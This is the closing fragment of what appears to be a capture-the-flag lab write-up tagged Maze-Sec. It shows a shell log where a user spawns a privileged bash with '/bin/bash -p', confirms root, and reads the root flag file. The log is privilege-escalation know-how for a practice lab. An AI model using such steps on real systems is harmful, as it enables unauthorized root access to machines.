<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunset@Per1:/opt$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-5.0# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-c27679de03aba03c5a33159aef11f8ea&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>perl</tag>
        <tag>python</tag>
      </tags>
  </entry>
</search>
